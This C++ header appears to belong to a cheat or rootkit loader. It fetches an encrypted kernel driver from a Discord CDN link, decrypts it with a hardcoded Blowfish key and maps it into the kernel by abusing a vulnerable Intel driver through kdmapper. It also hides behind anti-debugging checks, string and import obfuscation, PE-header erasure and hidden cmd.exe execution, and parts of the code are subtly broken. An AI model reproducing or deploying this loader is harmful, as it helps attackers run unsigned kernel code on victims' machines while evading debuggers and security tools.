#pragma once
#include <sstream>
#include "KDMapper/kdmapper.hpp"
#include "KDMapper/intel_driver.hpp"

struct encrypt_t
{
	std::string driver;
};

int bart()
{
	LI_FN(SetLastError).safe()(0);
	const auto last_error = LI_FN(GetLastError).safe()();

	return last_error != 0;
}

int abwe()
{
	unsigned long thread_hide_from_debugger = 0x11;

	const auto ntdll = LI_FN(LoadLibraryA).safe()(skCrypt("ntdll.dll"));

	if (ntdll == INVALID_HANDLE_VALUE || ntdll == NULL) { return false; }

	_NtQueryInformationProcess NtQueryInformationProcess = NULL;
	NtQueryInformationProcess = (_NtQueryInformationProcess)LI_FN(GetProcAddress).safe()(ntdll, skCrypt("NtQueryInformationProcess"));

	if (NtQueryInformationProcess == NULL) { return false; }

	(_NtSetInformationThread)(GetCurrentThread(), thread_hide_from_debugger, 0, 0, 0);

	return true;
}

int awer()
{
	int debugger_present = false;

	LI_FN(CheckRemoteDebuggerPresent).safe()(LI_FN(GetCurrentProcess).safe()(), &debugger_present);

	return debugger_present;
}

int were()
{
	int found = false;
	CONTEXT ctx = { 0 };
	void* h_thread = LI_FN(GetCurrentThread).safe()();

	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	if (LI_FN(GetThreadContext).safe()(h_thread, &ctx))
	{
		if ((ctx.Dr0 != 0x00) || (ctx.Dr1 != 0x00) || (ctx.Dr2 != 0x00) || (ctx.Dr3 != 0x00) || (ctx.Dr6 != 0x00) || (ctx.Dr7 != 0x00))
		{
			found = true;
		}
	}

	return found;
}

void system_no_output(std::string command)
{
	command.insert(0, "/C ");

	SHELLEXECUTEINFOA ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpFile = "cmd.exe";
	ShExecInfo.lpParameters = command.c_str();
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	if (ShellExecuteExA(&ShExecInfo) == FALSE)
		WaitForSingleObject(ShExecInfo.hProcess, INFINITE);

	DWORD rv;
	GetExitCodeProcess(ShExecInfo.hProcess, &rv);
	CloseHandle(ShExecInfo.hProcess);
}

std::string readFileIntoString(const std::string& path) {
	auto ss = std::ostringstream{};
	std::ifstream input_file(path);
	if (!input_file.is_open()) {
		std::cerr << " Auth Error: Could not opened save key" << std::endl;
		exit(EXIT_FAILURE);
	}
	ss << input_file.rdbuf();
	return ss.str();
}

VOID ErasePEHeaderFromMemory()
{
	DWORD OldProtect = 0;

	// Get base address of module
	char* pBaseAddr = (char*)GetModuleHandle(NULL);

	// Change memory protection
	VirtualProtect(pBaseAddr, 4096, // Assume x86 page size
		PAGE_READWRITE, &OldProtect);

	// Erase the header
	SecureZeroMemory(pBaseAddr, 4096);
}

std::string StreamFileToMemString(std::string URL) {
	const char* header = TEXT("Accept: *" "/" "*\r\n\r\n");
	HANDLE hInterWebz = InternetOpenA(TEXT("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HANDLE hURL = InternetOpenUrlA(hInterWebz, URL.c_str(), header, strlen(header), INTERNET_FLAG_DONT_CACHE, 0);

	char* Buffer = new char[100000000]; //100mb
	memset(Buffer, 0, 100000000);
	DWORD BytesRead = 1;

	std::string data;

	if (InternetReadFile(hURL, Buffer, 100000000, &BytesRead))
	{
		data = std::string(Buffer);
	}

	delete[] Buffer;
	InternetCloseHandle(hInterWebz);
	InternetCloseHandle(hURL);

	return data;
}

std::string GenerateHexString(int len) {
	srand(time(NULL));
	std::string str = TEXT("0123456789ABCDEF");
	std::string newstr;
	int pos;
	while (newstr.size() != len) {
		pos = ((rand() % (str.size() - 1)));
		newstr += str.substr(pos, 1);
	}
	return newstr;
}

std::vector<BYTE> GetDriverSYS()
{
	encrypt_t encrypt;
	BLOWFISH blowfish(xorstr("1337909537910263"));
	std::string data = StreamFileToMemString(TEXT(R"(https://cdn.discordapp.com/attachments/947218122363007058/982236719539712020/1)"));
	encrypt.driver = blowfish.Decrypt_CBC(data);
	std::vector<uint8_t> Vector(encrypt.driver.begin(), encrypt.driver.end());
	return Vector;
}

BOOL MapDriver(BYTE* data)
{
	HANDLE iqvw64e_device_handle = intel_driver::Load();
	if (iqvw64e_device_handle && iqvw64e_device_handle != INVALID_HANDLE_VALUE)
	{
		if (!kdmapper::MapDriver(iqvw64e_device_handle, data))
		{
			intel_driver::Unload(iqvw64e_device_handle);
			return false;
		}

		intel_driver::Unload(iqvw64e_device_handle);
		return true;
	}

	intel_driver::Unload(iqvw64e_device_handle);
	return false;
}

void DeleteKey(std::ifstream& File)
{
	std::string regfile("key.txt");
	std::ofstream(regfile, std::ios::trunc); // clears the file
	File.setstate(std::ios::failbit); // sets the status to failed
	remove(regfile.c_str()); // deletes the file
}

uint32_t CalculateChecksum(const std::string& data) {
	uint32_t checksum = 0;
	for (char c : data) {
		checksum += static_cast<uint32_t>(c);
	}
	return checksum;
}

std::string tm_to_readable_time(tm ctx) {
	char buffer[80];

	strftime(buffer, sizeof(buffer), "%a %m/%d/%y %H:%M:%S %Z", &ctx);

	return std::string(buffer);
}

static std::time_t string_to_timet(std::string timestamp) {
	auto cv = strtol(timestamp.c_str(), NULL, 10); // long

	return (time_t)cv;
}

static std::tm timet_to_tm(time_t timestamp) {
	std::tm context;

	localtime_s(&context, &timestamp);

	return context;
}